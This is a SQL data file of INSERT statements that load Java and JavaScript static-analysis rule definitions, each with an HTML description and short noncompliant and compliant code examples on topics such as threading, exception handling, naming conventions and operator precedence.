INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1082, 'IllegalMonitorStateException should not be caught', 'S2235', NULL, 'squid', '<p>According to Oracle Javadoc:</p>
<blockquote>
  <p><code>IllegalMonitorStateException</code> is thrown when a thread has attempted to wait on an object''s monitor or to notify other threads waiting
  on an object''s monitor without owning the specified monitor.</p>
</blockquote>
<p>In other words, this exception can be thrown only in case of bad design because <code>Object.wait(...)</code>, <code>Object.notify()</code> and
<code>Object.notifyAll()</code> methods should never be called on an object whose monitor is not held. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething(){
  ...
  try {
    ...
    anObject.notify();
    ...
  } catch(IllegalMonitorStateException e) {
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(){
  ...
  synchronized(anObject) {
    ...
    anObject.notify();
    ...
  }
}
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'multi-threading', false, 'HTML', 1510817813172, 1510817813172, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1083, 'Tabulation characters should not be used', 'S00105', 'S105', 'squid', '<p>Developers should not need to configure the tab width of their text editors in order to be able to read source code.</p>
<p>So the use of the tabulation character must be banned.</p>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'convention', false, 'HTML', 1510817813173, 1510817813173, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1084, 'Exit methods should not be called', 'S1147', NULL, 'squid', '<p>Calling <code>System.exit(int status)</code> or <code>Rutime.getRuntime().exit(int status)</code> calls the shutdown hooks and shuts downs the
entire Java virtual machine. Calling <code>Runtime.getRuntime().halt(int)</code> does an immediate shutdown, without calling the shutdown hooks, and
skipping finalization.</p>
<p>Each of these methods should be used with extreme care, and only when the intent is to stop the whole Java process. For instance, none of them
should be called from applications running in a J2EE container.</p>
<h2>Noncompliant Code Example</h2>
<pre>
System.exit(0);
Runtime.getRuntime().exit(0);
Runtime.getRuntime().halt(0);
</pre>
<h2>Exceptions</h2>
<p>These methods are ignored inside <code>main</code>.</p>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/382.html">MITRE, CWE-382</a> - Use of System.exit() </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/PoYbAQ">CERT, ERR09-J.</a> - Do not allow untrusted code to terminate the JVM </li>
</ul>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'cert,cwe,suspicious', false, 'HTML', 1510817813174, 1510817813174, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1085, '"hashCode" and "toString" should not be called on array instances', 'S2116', NULL, 'squid', '<p>While <code>hashCode</code> and <code>toString</code> are available on arrays, they are largely useless. <code>hashCode</code> returns the array''s
"identity hash code", and <code>toString</code> returns nearly the same value. Neither method''s output actually reflects the array''s contents.
Instead, you should pass the array to the relevant static <code>Arrays</code> method.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public static void main( String[] args )
{
    String argStr = args.toString(); // Noncompliant
    int argHash = args.hashCode(); // Noncompliant

</pre>
<h2>Compliant Solution</h2>
<pre>
public static void main( String[] args )
{
    String argStr = Arrays.toString(args);
    int argHash = Arrays.hashCode(args);

</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817813174, 1510817813175, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1087, 'Throwable.printStackTrace(...) should not be called', 'S1148', NULL, 'squid', '<p><code>Throwable.printStackTrace(...)</code> prints a <code>Throwable</code> and its stack trace to some stream. By default that stream
<code>System.Err</code>, which could inadvertently expose sensitive information.</p>
<p>Loggers should be used instead to print <code>Throwable</code>s, as they have many advantages:</p>
<ul>
  <li> Users are able to easily retrieve the logs. </li>
  <li> The format of log messages is uniform and allow users to browse the logs easily. </li>
</ul>
<p>This rule raises an issue when <code>printStackTrace</code> is used without arguments, i.e. when the stack trace is printed to the default
stream.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try {
  /* ... */
} catch(Exception e) {
  e.printStackTrace();        // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try {
  /* ... */
} catch(Exception e) {
  LOGGER.log("context", e);
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'error-handling', false, 'HTML', 1510817813177, 1510817813177, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1088, 'Methods "wait(...)", "notify()" and "notifyAll()" should not be called on Thread instances', 'S2236', NULL, 'squid', '<p>The methods <code>wait(...)</code>, <code>notify()</code> and <code>notifyAll()</code> are available on a <code>Thread</code> instance, but only
because all classes in Java extend <code>Object</code> and therefore automatically inherit those methods. But there are two very good reasons for not
calling them on a <code>Thread</code>:</p>
<ul>
  <li> Internally, the JVM relies on these methods to change the state of the Thread (<code>BLOCKED</code>, <code>WAITING</code>, ...), so calling
  them will corrupt the behavior of the JVM. </li>
  <li> It is not clear (perhaps even to the original coder) what is really expected. For instance, it is waiting for the execution of the Thread to
  suspended, or is it the acquisition of the object monitor that is waited for? </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
Thread myThread = new Thread(new RunnableJob());
...
myThread.wait(2000);
</pre>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'multi-threading', false, 'HTML', 1510817813178, 1510817813178, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1089, 'Track uses of disallowed classes', 'S3688', NULL, 'squid', '<p>This rule allows banning certain classes.</p>
<h2>Noncompliant Code Example</h2>
<p>Given parameters:</p>
<ul>
  <li> className:java.lang.String </li>
</ul>
<pre>
String name;  // Noncompliant
</pre>', 0, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, true, 'HTML', 1510817813179, 1510817813179, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1090, 'Control structures should use curly braces', 'S00121', 'S121', 'squid', '<p>While not technically incorrect, the omission of curly braces can be misleading, and may lead to the introduction of errors during maintenance.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)  // Noncompliant
  executeSomething();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition) {
  executeSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.8 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement </li>
  <li> MISRA C:2004, 14.9 - An if (expression) construct shall be followed by a compound statement. The else keyword shall be followed by either a
  compound statement, or another if statement </li>
  <li> MISRA C++:2008, 6-3-1 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement </li>
  <li> MISRA C++:2008, 6-4-1 - An if (condition) construct shall be followed by a compound statement. The else keyword shall be followed by either a
  compound statement, or another if statement </li>
  <li> MISRA C:2012, 15.6 - The body of an iteration-statement or a selection-statement shall be a compound-statement </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/1QGMAg">CERT, EXP19-C.</a> - Use braces for the body of an if, for, or while statement
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/3wHEAw">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement
  </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'cert,misra,pitfall', false, 'HTML', 1510817813180, 1510817813180, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1093, 'Limited dependence should be placed on operator precedence rules in expressions', 'S864', NULL, 'squid', '<p>The rules of operator precedence are complicated and can lead to errors. For this reason, parentheses should be used for clarification in complex
statements. However, this does not mean that parentheses should be gratuitously added around every operation. </p>
<p>This rule raises issues when <code>&amp;&amp;</code> and <code>||</code> are used in combination, when assignment and equality or relational
operators are used in together in a condition, and for other operator combinations according to the following table:</p>
<table>
  <tbody>
    <tr>
      <td> </td>
      <td><code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code></td>
      <td><code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>&gt;&gt;&gt;</code></td>
      <td><code>&amp;</code></td>
      <td><code>^</code></td>
      <td> <code>|</code> </td>
    </tr>
    <tr>
      <td><code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code></td>
      <td> </td>
      <td>x</td>
      <td>x</td>
      <td>x</td>
      <td>x</td>
    </tr>
    <tr>
      <td><code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>&gt;&gt;&gt;</code></td>
      <td>x</td>
      <td> </td>
      <td>x</td>
      <td>x</td>
      <td>x</td>
    </tr>
    <tr>
      <td><code>&amp;</code></td>
      <td>x</td>
      <td>x</td>
      <td> </td>
      <td>x</td>
      <td>x</td>
    </tr>
    <tr>
      <td><code>^</code></td>
      <td>x</td>
      <td>x</td>
      <td>x</td>
      <td> </td>
      <td>x</td>
    </tr>
    <tr>
      <td> <code>|</code> </td>
      <td>x</td>
      <td>x</td>
      <td>x</td>
      <td>x</td>
      <td> </td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
x = a + b - c;
x = a + 1 &lt;&lt; b;  // Noncompliant

if ( a &gt; b || c &lt; d || a == d) {...}
if ( a &gt; b &amp;&amp; c &lt; d || a == b) {...}  // Noncompliant
if (a = f(b,c) == 1) { ... } // Noncompliant; == evaluated first
</pre>
<h2>Compliant Solution</h2>
<pre>
x = a + b - c;
x = (a + 1) &lt;&lt; b;

if ( a &gt; b || c &lt; d || a == d) {...}
if ( (a &gt; b &amp;&amp; c &lt; d) || a == b) {...}
if ( (a = f(b,c)) == 1) { ... }
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 12.1 - Limited dependence should be placed on C''s operator precedence rules in expressions </li>
  <li> MISRA C:2004, 12.2 - The value of an expression shall be the same under any order of evaluation that the standard permits. </li>
  <li> MISRA C:2004, 12.5 - The operands of a logical &amp;&amp; or || shall be primary-expressions. </li>
  <li> MISRA C++:2008, 5-0-1 - The value of an expression shall be the same under any order of evaluation that the standard permits. </li>
  <li> MISRA C++:2008, 5-0-2 - Limited dependence should be placed on C++ operator precedence rules in expressions </li>
  <li> MISRA C++:2008, 5-2-1 - Each operand of a logical &amp;&amp; or || shall be a postfix-expression. </li>
  <li> MISRA C:2012, 12.1 - The precedence of operators within expressions should be made explicit </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/_wI">CERT, EXP00-C.</a> - Use parentheses for precedence of operation </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/VoAyAQ">CERT, EXP00-CPP.</a> - Use parentheses for precedence of operation </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/9wHEAw">CERT, EXP53-J.</a> - Use parentheses for precedence of operation </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/783.html">MITRE, CWE-783</a> - Operator Precedence Logic Error </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'cert,cwe,misra', false, 'HTML', 1510817813184, 1510817813184, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1094, '"SingleConnectionFactory" instances should be set to "reconnectOnException"', 'S3438', NULL, 'squid', '<p>Use of a Spring <code>SingleConnectionFactory</code> without enabling the <code>reconnectOnException</code> setting will prevent automatic
connection recovery when the connection goes bad. </p>
<p>That''s because the <code>reconnectOnException</code> property defaults to <code>false</code>. As a result, even if the code that uses this
connection factory (Spring''s <code>DefaultMessageListenerContainer</code> or your own code) has reconnect logic, that code won''t work because the
<code>SingleConnectionFactory</code> will act like a single-connection pool by preventing connection <code>close</code> calls from actually closing
anything. As a result, subsequent factory <code>create</code> operations will just hand back the original broken <code>Connection</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
 &lt;bean id="singleCF" class="org.springframework.jms.connection.SingleConnectionFactory"&gt;  &lt;!-- Noncompliant --&gt;
   &lt;constructor-arg ref="dummyConnectionFactory" /&gt;
 &lt;/bean&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
 &lt;bean id="singleCF" class="org.springframework.jms.connection.SingleConnectionFactory" p:reconnectOnException="true"&gt;
   &lt;constructor-arg ref="dummyConnectionFactory" /&gt;
 &lt;/bean&gt;
</pre>
<p>or</p>
<pre>
 &lt;bean id="singleCF" class="org.springframework.jms.connection.SingleConnectionFactory"&gt;
   &lt;constructor-arg ref="dummyConnectionFactory" /&gt;
   &lt;property name="reconnectOnException"&gt;&lt;value&gt;true&lt;/value&gt;&lt;/property&gt;
 &lt;/bean&gt;
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'spring', false, 'HTML', 1510817813185, 1510817813185, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1096, 'Reflection should not be used to check non-runtime annotations', 'S2109', NULL, 'squid', '<p>The writer of an annotation can set one of three retention policies for it:</p>
<ul>
  <li> <code>RetentionPolicy.SOURCE</code> - these annotations are dropped during compilation, E.G. <code>@Override</code>,
  <code>@SuppressWarnings</code>. </li>
  <li> <code>RetentionPolicy.CLASS</code> - these annotations are present in a compiled class but not loaded into the JVM at runtime. This is the
  default. </li>
  <li> <code>RetentionPolicy.RUNTIME</code> - these annotations are present in the class file and loaded into the JVM. </li>
</ul>
<p>Only annotations that have been given a <code>RUNTIME</code> retention policy will be available to reflection. Testing for annotations with any
other retention policy is simply an error, since the test will always return false.</p>
<p>This rule checks that reflection is not used to detect annotations that do not have <code>RUNTIME</code> retention.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Method m = String.class.getMethod("getBytes", new Class[] {int.class,
int.class, byte[].class, int.class});
if (m.isAnnotationPresent(Override.class)) {  // Noncompliant; test will always return false, even when @Override is present in the code
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817813187, 1510817813187, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1097, 'Untrusted data should not be stored in sessions', 'S3318', NULL, 'squid', '<p>Data in a web session is considered inside the "trust boundary". That is, it is assumed to be trustworthy. But storing unvetted data from an
unauthenticated user violates the trust boundary, and may lead to that data being used inappropriately.</p>
<p>This rule raises an issue when data from <code>Cookie</code>s or <code>HttpServletRequest</code>s is stored in a session. </p>
<h2>Noncompliant Code Example</h2>
<pre>
login = request.getParameter("login");
session.setAttribute("login", login);  // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/501">MITRE, CWE-501</a> - Trust Boundary Violation </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cwe', false, 'HTML', 1510817813188, 1510817813188, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1098, 'Abstract class names should comply with a naming convention', 'S00118', 'S118', 'squid', '<p>Sharing some naming conventions is a key point to make it possible for a team to efficiently collaborate. This rule allows to check that all
abstract class names match a provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression: <code>^Abstract[A-Z][a-zA-Z0-9]*$</code>:</p>
<pre>
abstract class MyClass { // Noncompliant
}

class AbstractLikeClass { // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
abstract class MyAbstractClass {
}

class LikeClass {
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'convention', false, 'HTML', 1510817813189, 1510817813189, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1135, 'Lines should not end with trailing whitespaces', 'TrailingWhitespace', NULL, 'javascript', '<p>Trailing whitespaces are simply useless and should not stay in code. They may generate noise when comparing different versions of the same file.</p>
<p>If you encounter issues from this rule, this probably means that you are not using an automated code formatter - which you should if you have the opportunity to do so. </p>

<h2>Noncompliant Code Example</h2>
<pre>
// The following string will error if there is a whitespace after ''\''
var str = "Hello \
World";
</pre>', 1, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'convention', false, 'HTML', 1510817813253, 1510817813253, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1136, '"alert(...)" should not be used', 'S1442', NULL, 'javascript', '<p>alert(...) can be useful for debugging during development, but in production mode this kind of pop-up could expose sensitive information to attackers, and should never be displayed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if(unexpectedCondition)
{
  alert("Unexpected Condition");
}
</pre>
<h2>See</h2>

<ul>
<li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code</li>
</ul>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cwe,user-experience', false, 'HTML', 1510817813254, 1510817813254, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1137, 'Attempts should not be made to update "const" variables', 'S3500', NULL, 'javascript', '<p>Variables declared with <code>const</code> cannot be modified. Unfortunately, attempts to do so don''t always raise an error; in a non-ES2015 environment,
  such an attempt might simply be ignored.</p>

<h2>Noncompliant Code Example</h2>
<pre>
const pi = "yes, please";
pi = 3.14;  //Noncompliant
</pre>', 4, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'es2015', false, 'HTML', 1510817813255, 1510817813255, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1138, 'Bitwise operators should not be used', 'BitwiseOperators', NULL, 'javascript', '<p>JavaScript does not have an integer type, but it does have bitwise operators <code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>&gt;&gt;&gt;</code>, <code>~</code>, <code>&amp;</code>, <code>|</code>. These operators convert their operands from floating point values to integers and back, so they are not as efficient as in C or other languages. Further, they are rarely useful in browser applications, and the similarity to the logical operators can mask some programming errors.</p>
<h2>Noncompliant Code Example</h2>

<pre>
if (a &amp; b) { ... } // Noncompliant; &amp; used in error
var oppositeSigns = ((x ^ y) &lt; 0); // Noncompliant; there''s a clearer way to test for this
</pre>
<h2>Compliant Solution</h2>

<pre>
if (a &amp;&amp; b) { ... }
var oppositeSigns = false;
if ( (x &lt; 0 &amp;&amp; y &gt; 0) || (x &gt; 0 &amp;&amp; y &lt; 0) ) {
  oppositeSigns = true;
}
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813256, 1510817813256, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1099, 'Conditionally executed blocks should be reachable', 'S2583', NULL, 'squid', '<p>Conditional expressions which are always <code>true</code> or <code>false</code> can lead to dead code. Such code is always buggy and should never
be used in production.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = false;
if (a) { // Noncompliant
  doSomething(); // never executed
}

if (!a || b) { // Noncompliant; "!a" is always "true", "b" is never evaluated
  doSomething();
} else {
  doSomethingElse(); // never executed
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/570.html">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/571">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP.</a> - Detect and remove code that has no effect </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cert,cwe,misra,pitfall,unused', false, 'HTML', 1510817813190, 1510817813191, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1100, 'Local variable and method parameter names should comply with a naming convention', 'S00117', 'S117', 'squid', '<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when a local variable or function parameter name does
not match the provided regular expression.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default regular expression <code>^[a-z][a-zA-Z0-9]*$</code>:</p>
<pre>
public void doSomething(int my_param) {
  int LOCAL;
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(int myParam) {
  int local;
  ...
}
</pre>
<h2>Exceptions</h2>
<p>Loop counters are ignored by this rule.</p>
<pre>
for (int i_1 = 0; i_1 &lt; limit; i_1++) {  // Compliant
  // ...
}
</pre>
<p>as well as one-character <code>catch</code> variables: </p>
<pre>
try {
//...
} catch (Exception e) { // Compliant
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'convention', false, 'HTML', 1510817813192, 1510817813192, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1101, 'Strings literals should be placed on the left side when checking for equality', 'S1132', NULL, 'squid', '<p>It is preferable to place string literals on the left-hand side of an <code>equals()</code> or <code>equalsIgnoreCase()</code> method call.</p>
<p>This prevents null pointer exceptions from being raised, as a string literal can never be null by definition.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String myString = null;

System.out.println("Equal? " + myString.equals("foo"));                        // Noncompliant; will raise a NPE
System.out.println("Equal? " + (myString != null &amp;&amp; myString.equals("foo")));  // Noncompliant; null check could be removed
</pre>
<h2>Compliant Solution</h2>
<pre>
System.out.println("Equal?" + "foo".equals(myString));                         // properly deals with the null case
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'bad-practice', false, 'HTML', 1510817813193, 1510817813194, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1102, 'Locks should be released', 'S2222', NULL, 'squid', '<p>If a lock is acquired and released within a method, then it must be released along all execution paths of that method.</p>
<p>Failing to do so will expose the conditional locking logic to the method''s callers and hence be deadlock-prone.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {
  private Lock lock = new Lock();

  public void doSomething() {
    lock.lock(); // Noncompliant
    if (isInitialized()) {
      // ...
      lock.unlock();
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {
  private Lock lock = new Lock();

  public void doSomething() {
    if (isInitialized()) {
      lock.lock();
      // ...
      lock.unlock();
    }
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cwe.mitre.org/data/definitions/459.html">MITRE, CWE-459</a> - Incomplete Cleanup </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cwe,multi-threading', false, 'HTML', 1510817813194, 1510817813195, 2);
